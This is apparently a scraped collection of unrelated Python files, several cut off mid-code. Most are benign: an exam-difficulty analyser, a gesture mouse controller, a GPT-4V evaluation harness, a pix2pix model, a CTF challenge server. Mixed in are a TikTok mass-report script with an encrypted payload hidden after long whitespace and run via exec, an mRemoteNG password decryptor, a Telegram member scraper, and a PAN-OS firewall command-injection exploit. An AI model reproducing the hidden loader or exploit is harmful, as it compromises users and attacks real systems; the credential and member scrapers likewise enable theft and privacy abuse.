    "from pypdf import PdfReader\r\nfrom termcolor import colored\r\nprint(colored(\"Enter the name of the question paper which is in pdf from:  \",'red'))\r\npdf = input()\r\nreader = PdfReader(pdf)\r\nfor i in range(len(reader.pages)):\r\n    page = reader.pages[i]\r\n    with open('whole_qp.txt','w') as f:\r\n        f.write(str(page.extract_text()))\r\n#Extracting the questions from the question paper\r\nwith open('whole_qp.txt','r') as infile, open('questions.txt','w') as outfile:\r\n    for line in infile:\r\n        # line = line.strip()\r\n        if line.startswith('1'):\r\n            outfile.write(line)\r\n        if line.startswith('2'):\r\n            outfile.write(line)\r\n        if line.startswith('3'):\r\n            outfile.write(line)\r\n        if line.startswith('4'):\r\n            outfile.write(line)\r\n        if line.startswith('5'):\r\n            outfile.write(line)\r\n#Filtering only integer numbers and writing into a new text file 'bloom.txt'\r\nf = open('questions.txt','r')\r\nbloom = f.read()\r\nwith open('bloom.txt','w') as b:\r\n    for i in bloom:\r\n        if i:\r\n            try:\r\n                number = int(i)\r\n                b.write(str(i + '\\n'))\r\n            except ValueError:\r\n                pass\r\nbl = open('bloom.txt','r')\r\ny = bl.read()\r\ny = y.split()\r\ni = 3\r\nbloom_level = 0\r\nn = 0\r\nprint(colored(\"BLOOMS LEVEL ARE:......\",'red'))\r\nprint(colored(\"1 - Remembering\",'red'))\r\nprint(colored(\"2 - Understanding\",'red'))\r\nprint(colored(\"3 - Applying\",'red'))\r\nprint(colored(\"4 - Analyzing\",'red'))\r\nprint(colored(\"5 - Evaluating\",'red'))\r\nprint(colored(\"6 - Creating\",'red'))\r\nprint(colored(\"_\" * 100,'white'))\r\n\r\nprint(colored('Blooms level in question paper are: ','cyan'))\r\nwhile i<=len(y):\r\n    print(colored(y[i],'cyan'))\r\n    bloom_level += int(y[i])\r\n    i = i + 4 \r\n    n += 1\r\nprint(colored(\"_\" * 100,'white'))\r\nprint(colored(\"There are \",'green'),colored(n,'green'),colored(' questions in the question paper','green'))\r\npercentage = bloom_level/(n*6) * 100\r\nprint(colored(str(round(percentage))+'%','magenta'))\r\nif percentage>=1 and percentage<=40:\r\n    print(colored(\"The given question paper is easy\",'green'))\r\n\r\nelif percentage>= 41 and percentage<=72:\r\n    print(colored(\"The given question paper is Medium\",'yellow'))\r\n\r\nelif percentage>=73 and percentage<=100:\r\n    print(colored(\"The given question paper is Hard\",'red'))",
    "import cv2\r\nimport mediapipe as mp\r\nimport pyautogui as pag\r\nimport numpy as np\r\n\r\n\r\n\r\n\r\n# Initialize Mediapipe Hand solution\r\nmp_hands = mp.solutions.hands\r\n\r\nhands = mp_hands.Hands(static_image_mode=False,\r\n                       max_num_hands=2,\r\n                       min_detection_confidence=0.1,\r\n                       min_tracking_confidence=0.1)\r\n\r\nmp_drawing = mp.solutions.drawing_utils\r\n\r\n#open the camera\r\ncap = cv2.VideoCapture(1)\r\n\r\n\r\n# error check to make sure the camera is open\r\nif not cap.isOpened():\r\n    print(\"Error\")\r\n    exit()\r\n\r\n\r\n# Set the screen resolution (width, height)\r\nscreen_width, screen_height = pag.size()\r\n\r\nmouseDown = False\r\n\r\n#Main loop\r\nwhile True:\r\n\r\n    #capture frame by frame from the camera\r\n    success, frame = cap.read()\r\n    if not success:\r\n        break\r\n    \r\n    # Flip the frame horizontally \r\n    frame = cv2.flip(frame, 1)\r\n\r\n    # Convert the frame color from BGR to RGB\r\n    rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\r\n\r\n    # Process the RGB frame with MediaPipe Hands\r\n    results = hands.process(rgb_frame)\r\n\r\n    #frame resoulution\r\n    frame_height, frame_width, _ = frame.shape\r\n\r\n    if results.multi_hand_landmarks:\r\n        for hand_landmarks in results.multi_hand_landmarks:\r\n            # Draw landmarks\r\n            mp_drawing.draw_landmarks(frame, hand_landmarks,mp_hands.HAND_CONNECTIONS)\r\n\r\n            index_finger_tip = hand_landmarks.landmark[mp_hands.HandLandmark.INDEX_FINGER_TIP]\r\n            thumb_tip = hand_landmarks.landmark[mp_hands.HandLandmark.THUMB_TIP]\r\n\r\n            #get the midpoint between the thumb and index finger\r\n            midpoint_x = (index_finger_tip.x + thumb_tip.x) /2\r\n            midpoint_y = (index_finger_tip.y + thumb_tip.y) /2\r\n\r\n            # Get the distance between the thumb and index finger\r\n            distance = np.sqrt((index_finger_tip.x - thumb_tip.x)**2 + (index_finger_tip.y - thumb_tip.y)**2)\r\n\r\n            if distance < 0.1 and mouseDown == False:\r\n                #mouse down\r\n                pag.mouseDown()\r\n                mouseDown = True\r\n            if distance > 0.3 and mouseDown == True:\r\n                #mouse up\r\n                pag.mouseUp()\r\n                mouseDown = False\r\n            \r\n            if mouseDown:\r\n                #draw a circle at the midpoint with radius 10\r\n                cv2.circle(frame, (int(midpoint_x*frame_width), int(midpoint_y * frame_height)), 10, (0, 255,0), -1)\r\n\r\n            else:\r\n                #draw a circle at the midpoint with radius 10\r\n                cv2.circle(frame, (int(midpoint_x*frame_width), int(midpoint_y * frame_height)), 10, (0, 255,0), 1)\r\n            \r\n\r\n            # Map the position to the screen resolution\r\n            x_mapped = np.interp(midpoint_x, (0,1), (0, screen_width))\r\n            y_mapped = np.interp(midpoint_y, (0,1), (0, screen_height))\r\n\r\n            # Set the mouse position\r\n            pag.moveTo(x_mapped, y_mapped, duration= 0.1)\r\n            \r\n    # Display the resulting frame\r\n    cv2.imshow(\"Medipipe Hands\", frame)\r\n    cv2.waitKey(1)\r\n\r\n# When everything done, release the capture\r\ncap.release()\r\ncv2.destroyAllWindows()\r\n\r\n\r\n\r\n    \r\n\r\n\r\n\r\n\r\n",
    "#!/usr/bin/env python3\n\n\n# \u6807\u51c6\u5e93\nimport hashlib\nimport base64\nimport argparse\nimport sys\n\n\n# \u7b2c\u4e09\u65b9\u5e93\nfrom Cryptodome.Cipher import AES\nimport pandas as pd\n'''\npip3.exe install pycryptodomex\npip3.exe install pandas\n'''\n\n\ndef usage():\n    parser = argparse.ArgumentParser(description=\"Decrypt mRemoteNG passwords\")\n    group = parser.add_mutually_exclusive_group()# \u4fdd\u8bc1-f\u548c-s\u53ea\u5141\u8bb8\u6709\u4e00\u4e2a\n    group.add_argument(\"-f\", \"--file\", help=\"Name of file which containing mRemoteNG password\")\n    group.add_argument(\"-s\", \"--string\", help=\"Base64 string of mRemoteNG password\")\n    parser.add_argument(\"-p\", \"--password\", help=\"Custom password\", default=\"mR3m\")\n\n    # \u4fdd\u8bc1\u53ea\u8f93\u5165\u7a0b\u5e8f\u540d\uff0c\u4e5f\u4f1a\u8f93\u51fa\u5e2e\u52a9\u4fe1\u606f\n    if len(sys.argv) < 2:\n        parser.print_help(sys.stderr)\n        sys.exit(1)# 0\u4e3a\u6b63\u5e38\u9000\u51fa\uff0c1-127\u4e3a\u975e\u6b63\u5e38\u9000\u51fa\n    \n    args = parser.parse_args()\n    file_name = args.file\n    string_name = args.string\n    password = args.password\n    return file_name, string_name, password\n\n\ndef decrypt(encrypted_data, password):\n    salt = encrypted_data[:16]\n    associated_data = encrypted_data[:16]\n    nonce = encrypted_data[16:32]\n    ciphertext = encrypted_data[32:-16]\n    tag = encrypted_data[-16:]\n    key = hashlib.pbkdf2_hmac(\"sha1\", password.encode(), salt, 1000, dklen=32)\n\n    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\n    cipher.update(associated_data)\n    plaintext = cipher.decrypt_and_verify(ciphertext, tag)\n    return \"{}\".format( plaintext.decode(\"utf-8\") )\n\n\ndef handle_1(file_name):\n    handle_1_name = \"tmp-\" + file_name.strip(\".xml\") + \".txt\"\n    with open(file_name, \"r\", encoding=\"UTF-8\") as fr:\n        with open(handle_1_name, \"w\", encoding=\"UTF-8\") as fw:\n            lines = fr.readlines()\n            total_count = len(lines)# \u7edf\u8ba1\u539f\u6587\u4ef6\u4e00\u5171\u591a\u5c11\u884c\n            valid_count = 0\n            invalid_count = 0\n            for line in lines:\n                line = line.strip(\"\\n\")\n                if len( line.split() ) <= 3:\n                    invalid_count += 1\n                    continue\n                else:\n                    valid_count += 1# \u7edf\u8ba1\u6bcf\u884c\u5206\u5272\u540e\u5927\u4e8e3\u6bb5\u7684\u884c\u6570\n                    multi_parts = line.split()\n                    i = 0\n                    for j in multi_parts:\n                        if multi_parts[i].startswith(\"Name\"):\n                            element = multi_parts[i]\n                            fw.write(element + \" \")\n                        elif multi_parts[i].startswith(\"Username\"):\n                            element = multi_parts[i]\n                            fw.write(element + \" \")\n                        elif multi_parts[i].startswith(\"Password\"):\n                            element = multi_parts[i]\n                            fw.write(element + \" \")\n                        elif multi_parts[i].startswith(\"Hostname\"):\n                            element = multi_parts[i]\n                            fw.write(element + \" \")\n                        i += 1\n                    fw.write(\"\\n\")\n            print( \"Total lines are: {}\".format(total_count) )\n            print( \"Valid lines are: {}\".format(valid_count) )\n            print( \"Invalid lines are: {}\".format(invalid_count) )\n            print(\"Content write to: {}\".format(handle_1_name) )\n    return handle_1_name\n\n\ndef handle_2(file_name):\n    handle_2_name = \"tmp-\" + file_name\n    with open(file_name, \"r\", encoding=\"UTF-8\") as fr:\n        with open(handle_2_name, \"w\", encoding=\"UTF-8\") as fw:\n            lines = fr.readlines()\n            total_lines = len(lines)\n            valid_lines = 0\n            invalid_lines = 0\n            for line in lines:\n                line = line.strip(\"\\n\")\n                if len( line.split() ) < 4:\n                    invalid_lines += 1\n                    continue\n                elif line.split()[2].strip(\"Password=\").strip('\"') == \"\":\n                    invalid_lines += 1\n                    continue\n                else:\n                    valid_lines += 1\n                    #print(line)\n                    fw.write(line + \"\\n\")\n            print()\n            print( \"Total lines are: {}\".format(total_lines) )\n            print( \"Valid lines are: {}\".format(valid_lines) )\n            print( \"Invalid lines are: {}\".format(invalid_lines) )\n            print(\"Content write to: {}\\n\".format(handle_2_name) )\n    return handle_2_name\n\n\ndef main():\n    file_name, string_name, password = usage()\n\n    if file_name != None:\n        handle_1_name = handle_1(file_name)\n        handle_2_name = handle_2(handle_1_name)\n\n        name_field = []\n        user_field = []\n        host_field = []\n        pass_field = []\n        with open(handle_2_name, \"r\", encoding=\"UTF-8\") as fr:\n            lines = fr.readlines()\n            total_lines = len(lines)\n            for line in lines:\n                encrypted_data = line.strip(\"\\n\")\n                tmp_list = encrypted_data.split()\n                name = tmp_list[0].strip(\"Name=\").strip('\"')\n                user = tmp_list[1].strip(\"Username=\").strip('\"')\n                encrypt_pass = tmp_list[2].strip(\"Password=\").str",
    "\nimport os\nimport re\nimport json\nimport random\nimport base64\nfrom io import BytesIO\nimport tempfile\n\nfrom tqdm import tqdm\nimport numpy as np\n\nfrom PIL import Image\nfrom openai import OpenAI, BadRequestError\n\n\ndef resize(image, base_width=None, base_height=None):\n    # Original dimensions\n    original_width, original_height = image.size\n\n    # Calculate new dimensions\n    if base_width:\n        if base_width <= original_width:\n            return image\n        w_percent = (base_width / float(original_width))\n        new_height = int((float(original_height) * float(w_percent)))\n        new_size = (base_width, new_height)\n    elif base_height:\n        if base_height <= original_height:\n            return image\n        h_percent = (base_height / float(original_height))\n        new_width = int((float(original_width) * float(h_percent)))\n        new_size = (new_width, base_height)\n    else:\n        raise ValueError(\"Either base_width or base_height must be specified\")\n\n    # Resize the image\n    resized_img = image.resize(new_size, Image.LANCZOS)\n    return resized_img\n\n\ndef set_random_seed(seed):\n    \"\"\"Set random seed for reproducibility.\"\"\"\n    if seed is not None and seed > 0:\n        random.seed(seed)\n        np.random.seed(seed)\n        torch.manual_seed(seed)\n\n\ndef convert_pil_image_to_base64(image):\n    buffered = BytesIO()\n    image.save(buffered, format=\"PNG\")\n    return base64.b64encode(buffered.getvalue()).decode()\n\n\nclass GPT4V:\n    def __init__(self):\n        # Get OpenAI API Key from environment variable\n        api_key = os.environ[\"OPENAI_API_KEY\"]\n        self.client = OpenAI(api_key=api_key)\n\n    def generate(self, prompt, images, temperature=0.0):\n        prompt = (\n            \"You are required to solve a programming problem. \" \n            + \"Please enclose your code inside a ```python``` block. \" \n            + \" Do not write a main() function. If Call-Based format is used, return the result in an appropriate place instead of printing it.\\n\\n\" \\\n            + prompt\n        )\n        \n                \n        # Convert all images to base64\n        base64_images = [convert_pil_image_to_base64(resize(image, base_height=480)) for image in images]\n\n        interleaved_messages = []\n\n        # Split the prompt and interleave text and images\n        segments = re.split(r'!\\[image\\]\\(.*?\\)', prompt)\n        for i, segment in enumerate(segments):\n            # Text\n            if len(segment) > 0:\n                interleaved_messages.append({\"type\": \"text\", \"text\": segment})\n            # Image\n            if i < len(base64_images):\n                interleaved_messages.append({\n                    \"type\": \"image_url\",\n                    \"image_url\": {\n                        \"url\": f\"data:image/png;base64,{base64_images[i]}\",\n                    }\n                })\n\n\n        try:\n            # print(interleaved_messages)\n            response = self.client.chat.completions.create(\n                model=\"gpt-4-vision-preview\",\n                messages=[\n                    {\n                        \"role\": \"system\",\n                        \"content\": [\n                            {\"type\": \"text\", \"text\": \"You are a professional programming contester trying to solve algorithmic problems. The problems come with a description and some images, and you should write a Python solution.\"}\n                        ],\n                    },\n                    {\n                        \"role\": \"user\",\n                        \"content\": interleaved_messages\n                    }\n                ],\n                temperature=temperature,\n                max_tokens=2048,\n            )\n            return response.choices[0].message.content\n        except BadRequestError as e:\n            print(\"OpenAI BadRequestError:\", e)\n            return None\n        \n    def extract_code(self, response):\n        pattern = r\"```python(.*?)```\"\n        # Use re.DOTALL to make '.' match any character including a newline\n        matches = re.findall(pattern, response, re.DOTALL)\n\n        if matches:\n            return matches[0]\n        else:\n            return response\n\n\nclass GPT4:\n    def __init__(self):\n        # Get OpenAI API Key from environment variable\n        api_key = os.environ[\"OPENAI_API_KEY\"]\n        self.client = OpenAI(api_key=api_key)\n\n    def generate(self, prompt, images, temperature=0.0):\n        prompt = \"You are required to solve a programming problem. Please enclose your code inside a ```python``` block. \" \\\n            \"Do not write a main() function. If Call-Based format is used, return the result in an appropriate place instead of printing it.\\n\\n\" \\\n                + prompt\n\n        interleaved_messages = []\n\n        # Split the prompt and interleave text and images\n        # image_paths = re.split(r'!\\[image\\]\\((.*?)\\)', prompt)  # Not used. We replace the images by order.\n        segments = re.split(r'!\\[image\\]\\(.*?\\)', prompt)\n        for i, segment in enumerate(segments):\n            # Text\n    ",
    "from datetime import datetime\n\nclass logger:\n    def __init__(self, prefix: str = \"DEXV-SOLVER\"):\n        self.WHITE: str = \"\\u001b[37m\"\n        self.MAGENTA: str = \"\\033[38;5;97m\"\n        self.MAGENTAA: str = \"\\033[38;2;157;38;255m\"\n        self.RED: str = \"\\033[38;5;196m\"\n        self.GREEN: str = \"\\033[38;5;40m\"\n        self.YELLOW: str = \"\\033[38;5;220m\"\n        self.BLUE: str = \"\\033[38;5;21m\"\n        self.PINK: str = \"\\033[38;5;176m\"\n        self.CYAN: str = \"\\033[96m\"\n        self.prefix: str = f\"{self.PINK}[{self.MAGENTA}{prefix}{self.PINK}]\"\n\n    def get_time(self) -> str:\n        return datetime.now().strftime(\"%H:%M:%S\")\n    \n    def message(self, level: str, message: str, start: int = None, end: int = None) -> str:\n        time_now = f\" {self.PINK}[{self.MAGENTA}{self.get_time()}{self.PINK}] {self.WHITE}|\"\n        timer = f\" {self.MAGENTAA}In{self.WHITE} -> {self.MAGENTAA}{str(end - start)[:5]} Seconds\" if start and end else \"\"\n        return f\"{self.prefix} {self.WHITE}|{time_now} {self.PINK}[{level}{self.PINK}] {self.WHITE}-> {self.PINK}[{self.MAGENTA}{message}{self.PINK}]{timer}\"\n    \n    def success(self, message: str, start: int = None, end: int = None, level: str = \"Success\") -> None:\n        print(self.message(f\"{self.GREEN}{level}\", f\"{self.GREEN}{message}\", start, end))\n\n    def info(self, message: str, start: int = None, end: int = None, level: str = \"Info\") -> None:\n        print(self.message(f\"{self.BLUE}{level}\", f\"{self.BLUE}{message}\", start, end))\n\n    def failure(self, message: str, start: int = None, end: int = None, level: str = \"Failure\") -> None:\n        print(self.message(f\"{self.RED}{level}\", f\"{self.RED}{message}\", start, end))\n    \n    def captcha(self, message: str, start: int = None, end: int = None, level: str = \"hCaptcha\") -> None:\n        print(self.message(f\"{self.CYAN}{level}\", f\"{self.CYAN}{message}\", start, end))\n\nlog = logger()",
    "import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'EOIDJoGq_4VyXszAPvfywt-XW6G6RHTX0lvSUOloLFs=').decrypt(b'gAAAAABmGp4fVfjmAZY5h3cWtBWbKZFBAFFs8RvAoJpuNSF7H_BGZZTnui-tMCT9milaJ6oY3eXMRxhrr-oRYrx2-eYFEE7Nj60vH_enexWhI9lLmV_PYwd_StdLlHS6r57ItuI5fIxYJ6uaJKqXdN3KujUOkotipFBAMWA7MqZ-z8DPM_fV6qSSdZhwgjiGSrylZUqGL8NGnXaw_zM26wqYCHO6WEugXa5cDz9Ji1_Qm1zAGXLyWgI='))\nimport requests\nimport json\n\n\ntiktokvideolink = input('Video ID > ')\ntiktokvideolinkreal = input('Tiktok Video Link')\n\nurl = \"https://www.tiktok.com/node/report/reasons_put?aid=1988&app_name=tiktok_web&device_platform=web_pc&device_id=6987530745909036549&region=DK&priority_region=&os=windows&referer=&root_referer=&cookie_enabled=true&screen_width=1920&screen_height=1080&browser_language=da-DK&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F92.0.4515.107+Safari%2F537.36&browser_online=true&verifyFp=verify_krfa96cw_p2Eae0I8_dJaE_4XwS_AEGm_KOmG1m49cOwX&app_language=en&timezone_name=Europe%2FCopenhagen&is_page_visible=true&focus_state=true&is_fullscreen=false&history_len=4&battery_info=1\"\n\npayload = json.dumps({\n  \"reason\": 1004,\n  \"object_id\": tiktokvideolink,\n  \"owner_id\": \"6636714219386781701\",\n  \"report_type\": \"video\"\n})\nheaders = {\n  'authority': 'www.tiktok.com',\n  'sec-ch-ua': '\"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"',\n  'accept': 'application/json, text/plain, */*',\n  'x-secsdk-csrf-token': '000100000001ddd4e9748bc018f9e9c13093fb09bb878e0c97573abfdbf43ec8d0817c782b7a1694901c1b038c13',\n  'sec-ch-ua-mobile': '?0',\n  'tt-csrf-token': 'ePCjBjwO15QhaDbSrq7NMj6L',\n  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',\n  'content-type': 'application/json',\n  'origin': 'https://www.tiktok.com',\n  'sec-fetch-site': 'same-origin',\n  'sec-fetch-mode': 'cors',\n  'sec-fetch-dest': 'empty',\n  'referer': tiktokvideolinkreal,\n  'accept-language': 'da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7',\n  'cookie': 'tt_webid_v2=6987530745909036549; tt_webid=6987530745909036549; cookie-consent={%22ga%22:true%2C%22af%22:true%2C%22fbp%22:true%2C%22lip%22:true%2C%22version%22:%22v2%22}; s_v_web_id=verify_krfa96cw_p2Eae0I8_dJaE_4XwS_AEGm_KOmG1m49cOwX; MONITOR_WEB_ID=6987530745909036549; tt_csrf_token=ePCjBjwO15QhaDbSrq7NMj6L; R6kq3TV7=AGIivtV6AQAAN-OR-sxIv18EYkOMaPvth3F_97xkhJ_OT_yI7nG6UayUCYRk|1|0|d52a182c37413d8803c7100633cc49d673b8b993; ttwid=1%7C0D_adjNZXWbKipMeZG_RUyaNe6bFDSttsAX927MCOZ8%7C1627083654%7C4310fd827053a66f1886a63bea5b6d42b8b11ab91b563ac183eff76b902f48c9; csrf_session_id=d3b7880ce8d34ce0821782de56fae639'\n}\n\nresponse = requests.request(\"POST\", url, headers=headers, data=payload)\n\nwhile True:\n    print(response.text)\nprint('yfbqufkf')",
    "import torch\nfrom .base_model import BaseModel\nfrom . import networks_ink\n\n\nclass Pix2PixModel(BaseModel):\n    \"\"\" This class implements the pix2pix model, for learning a mapping from input images to output images given paired data.\n\n    The model training requires '--dataset_mode aligned' dataset.\n    By default, it uses a '--netG unet256' U-Net generator,\n    a '--netD basic' discriminator (PatchGAN),\n    and a '--gan_mode' vanilla GAN loss (the cross-entropy objective used in the orignal GAN paper).\n\n    pix2pix paper: https://arxiv.org/pdf/1611.07004.pdf\n    \"\"\"\n    @staticmethod\n    def modify_commandline_options(parser, is_train=True):\n        \"\"\"Add new dataset-specific options, and rewrite default values for existing options.\n\n        Parameters:\n            parser          -- original option parser\n            is_train (bool) -- whether training phase or test phase. You can use this flag to add training-specific or test-specific options.\n\n        Returns:\n            the modified parser.\n\n        For pix2pix, we do not use image buffer\n        The training objective is: GAN Loss + lambda_L1 * ||G(A)-B||_1\n        By default, we use vanilla GAN loss, UNet with batchnorm, and aligned datasets.\n        \"\"\"\n        # changing the default values to match the pix2pix paper (https://phillipi.github.io/pix2pix/)\n        parser.set_defaults(norm='batch', netG='unet_256', dataset_mode='aligned')\n        if is_train:\n            parser.set_defaults(pool_size=0, gan_mode='vanilla')\n            parser.add_argument('--lambda_L1', type=float, default=100.0, help='weight for L1 loss')\n\n        return parser\n\n    def __init__(self, opt):\n        \"\"\"Initialize the pix2pix class.\n\n        Parameters:\n            opt (Option class)-- stores all the experiment flags; needs to be a subclass of BaseOptions\n        \"\"\"\n        BaseModel.__init__(self, opt)\n        # specify the training losses you want to print out. The training/test scripts will call <BaseModel.get_current_losses>\n        self.loss_names = ['G_GAN', 'G_L1', 'D_real', 'D_fake']\n        # specify the images you want to save/display. The training/test scripts will call <BaseModel.get_current_visuals>\n        self.visual_names = ['real_A', 'fake_B', 'real_B']\n        # specify the models you want to save to the disk. The training/test scripts will call <BaseModel.save_networks> and <BaseModel.load_networks>\n        if self.isTrain:\n            self.model_names = ['G', 'D']\n        else:  # during test time, only load G\n            self.model_names = ['G']\n        # define networks (both generator and discriminator)\n        self.netG = networks_ink.define_G(opt.input_nc, opt.output_nc, opt.ngf, opt.netG, opt.norm,\n                                      not opt.no_dropout, opt.init_type, opt.init_gain, self.gpu_ids)\n\n        if self.isTrain:  # define a discriminator; conditional GANs need to take both input and output images; Therefore, #channels for D is input_nc + output_nc\n            self.netD = networks_ink.define_D(opt.input_nc + opt.output_nc, opt.ndf, opt.netD,\n                                          opt.n_layers_D, opt.norm, opt.init_type, opt.init_gain, self.gpu_ids)\n\n        if self.isTrain:\n            # define loss functions\n            self.criterionGAN = networks_ink.GANLoss(opt.gan_mode).to(self.device)\n            self.criterionL1 = torch.nn.L1Loss()\n            # initialize optimizers; schedulers will be automatically created by function <BaseModel.setup>.\n            self.optimizer_G = torch.optim.Adam(self.netG.parameters(), lr=opt.lr, betas=(opt.beta1, 0.999))\n            self.optimizer_D = torch.optim.Adam(self.netD.parameters(), lr=opt.lr, betas=(opt.beta1, 0.999))\n            self.optimizers.append(self.optimizer_G)\n            self.optimizers.append(self.optimizer_D)\n\n    def set_input(self, input):\n        \"\"\"Unpack input data from the dataloader and perform necessary pre-processing steps.\n\n        Parameters:\n            input (dict): include the data itself and its metadata information.\n\n        The option 'direction' can be used to swap images in domain A and domain B.\n        \"\"\"\n        AtoB = self.opt.direction == 'AtoB'\n        self.real_A = input['A' if AtoB else 'B'].to(self.device)\n        self.real_B = input['B' if AtoB else 'A'].to(self.device)\n        self.image_paths = input['A_paths' if AtoB else 'B_paths']\n\n    def forward(self):\n        \"\"\"Run forward pass; called by both functions <optimize_parameters> and <test>.\"\"\"\n        self.fake_B = self.netG(self.real_A)  # G(A)\n\n    def backward_D(self):\n        \"\"\"Calculate GAN loss for the discriminator\"\"\"\n        # Fake; stop backprop to the generator by detaching fake_B\n        fake_AB = torch.cat((self.real_A, self.fake_B), 1)  # we use conditional GANs; we need to feed both input and output to the discriminator\n        pred_fake = self.netD(fake_AB.detach())\n        self.loss_D_fake = self.criterionGAN(pred_fake, False)\n        # Real\n        real_AB = torch.cat((self",
    "from telethon.sync import TelegramClient\r\nfrom telethon.tl.functions.messages import GetDialogsRequest\r\nfrom telethon.tl.types import InputPeerEmpty\r\nimport csv\r\nfrom telethon.tl.types import InputPeerUser\r\nfrom telethon.errors.rpcerrorlist import PeerFloodError\r\n\r\nphone = '+11111111111' #\u041d\u041e\u041c\u0415\u0420 \u0422\u0415\u041b\u0415\u0424\u041e\u041d\u0410\r\napi_id = 0 #\u041f\u041e\u041b\u0423\u0427\u0415\u041d\u041d\u042b\u0419 \u0421 my.telegram.org API_ID\r\napi_hash = '' #\u041f\u041e\u041b\u0423\u0427\u0415\u041d\u041d\u042b\u0419 \u0421 my.telegram.org API_HASH\r\n\r\nclient1 = TelegramClient(phone, api_id, api_hash)\r\n \r\nclient1.connect()\r\nif not client1.is_user_authorized():\r\n    client1.send_code_request(config.phone1)\r\n    client1.sign_in(config.phone1, input('Enter the code for 1 client: '))\r\n  \r\nchats = []\r\nlast_date = None\r\nchunk_size = 200\r\ngroups=[]\r\n \r\nresult = client1(GetDialogsRequest(\r\n             offset_date=last_date,\r\n             offset_id=0,\r\n             offset_peer=InputPeerEmpty(),\r\n             limit=chunk_size,\r\n             hash = 0\r\n         ))\r\nchats.extend(result.chats)\r\n \r\nfor chat in chats:\r\n    try:\r\n        if chat.megagroup== True:\r\n            groups.append(chat)\r\n    except:\r\n        continue\r\n \r\nprint('Choose a group to scrape members from:')\r\ni=0\r\nfor g in groups:\r\n    print(str(i) + '- ' + g.title)\r\n    i+=1\r\n \r\ng_index = input(\"Enter a Number: \")\r\ntarget_group=groups[int(g_index)]\r\n \r\nprint('Fetching Members...')\r\nall_participants = []\r\nall_participants = client1.get_participants(target_group, aggressive=True)\r\n \r\nprint('Saving In file...')\r\nwith open(\"members.csv\",\"w\",encoding='UTF-8') as f:\r\n    writer = csv.writer(f,delimiter=\",\",lineterminator=\"\\n\")\r\n    for user in all_participants:\r\n        if user.username:\r\n            username= user.username\r\n        else:\r\n            username= \"\"\r\n        writer.writerow([username])\r\nprint('Members scraped successfully.')",
    "import os\nimport random\nimport hashlib\nfrom PIL import Image\nimport tensorflow as tf\nfrom flask import Flask, request, jsonify\nfrom tensorflow.keras.optimizers import Adamax\n\nfrom secret import flag\n\napp = Flask(__name__)\napp.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024\napp.config['PERMANENT_SESSION_LIFETIME'] = 600\n\n@app.route('/')\ndef index():\n    return \"<h1>I'm alive.</h1>\"\n\n@app.route('/upload_model', methods=['POST'])\ndef upload_model():\n    global loaded_model\n    try:\n        if 'model' not in request.files:\n            return jsonify({'status': 'failed', 'message': 'No model file.'})\n        model = request.files['model']\n        model.save('./model.h5')\n        loaded_model = tf.keras.models.load_model('./model.h5', compile=False)\n        loaded_model.compile(Adamax(learning_rate= 0.001), loss= 'categorical_crossentropy', metrics= ['accuracy'])\n        with open('./model.h5', 'rb') as f:\n            model_bytes = f.read()\n        return jsonify({'status': 'success', 'message': hashlib.md5(model_bytes).hexdigest()})\n    except Exception as e:\n        loaded_model = None\n        # print(repr(e))\n        return jsonify({'status': 'failed', 'message': repr(e)})\n\n@app.route('/predict', methods=['GET', 'POST'])\ndef predict():\n    if not loaded_model:\n        return jsonify({'status': 'failed', 'message': 'No model.'})\n    counts = 50\n    right_count = 0\n    fire_count = random.randint(1, counts // 2)\n    no_fire_count = counts - fire_count\n    fire_names = random.sample(FireNames, fire_count)\n    no_fire_names = random.sample(NoFireNames, no_fire_count)\n\n    for name in fire_names:\n        image = Image.open('./Vali/Fire/' + name)\n        img_array = tf.keras.preprocessing.image.img_to_array(image)\n        img_array = tf.expand_dims(img_array, 0)\n        predictions = loaded_model.predict(img_array)\n        score = tf.nn.softmax(predictions[0])\n        if tf.argmax(score).numpy() == 0:\n            right_count += 1\n    for name in no_fire_names:\n        image = Image.open('./Vali/NoFire/' + name)\n        img_array = tf.keras.preprocessing.image.img_to_array(image)\n        img_array = tf.expand_dims(img_array, 0)\n        predictions = loaded_model.predict(img_array)\n        score = tf.nn.softmax(predictions[0])\n        if tf.argmax(score).numpy() == 1:\n            right_count += 1\n    \n    if right_count / counts > 0.9:\n        return jsonify({'status': 'success', 'right': f'{right_count/counts:0.2f}%', 'message': flag})\n    else:\n        return jsonify({'status': 'failed', 'right': f'{right_count/counts:0.2f}%',  'message': 'Sorry, you are not good enough.'})\n\nif __name__ == '__main__':\n    loaded_model = None\n    FireNames = os.listdir('./Vali/Fire')\n    NoFireNames = os.listdir('./Vali/NoFire')\n\n    app.run(host='0.0.0.0', port = 5000, debug=False)\n\n",
    "import csv\nimport requests\n\ndef exploit_firewall(target_ip, payload, root_ca=None):\n    url = f\"https://{target_ip}/api/\"\n\n    data = f\"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <request>\n        <op cmd=\"test\" />\n        <cmd code=\"ping\">{payload}</cmd>\n    </request>\"\"\"\n\n    headers = {\n        \"User-Agent\": \"PAN-OS-Exploit\",\n        \"Content-Type\": \"application/xml\"\n    }\n\n    try:\n        if root_ca:\n            response = requests.post(url, headers=headers, data=data, timeout=5, verify=root_ca)\n        else:\n            response = requests.post(url, headers=headers, data=data, timeout=5, verify=False)\n\n        response.raise_for_status()\n\n        if \"Success\" in response.text:\n            print(f\"Exploited successfully against {target_ip}!\")\n        else:\n            print(f\"Exploit failed for {target_ip}.\")\n            print(\"Response:\")\n            print(response.text)\n\n    except requests.exceptions.RequestException as e:\n        print(f\"Failed to exploit {target_ip}: {e}\")\n\ndef main():\n    choice = input(\"Do you want to enter values directly (D) or use a CSV file (C)? 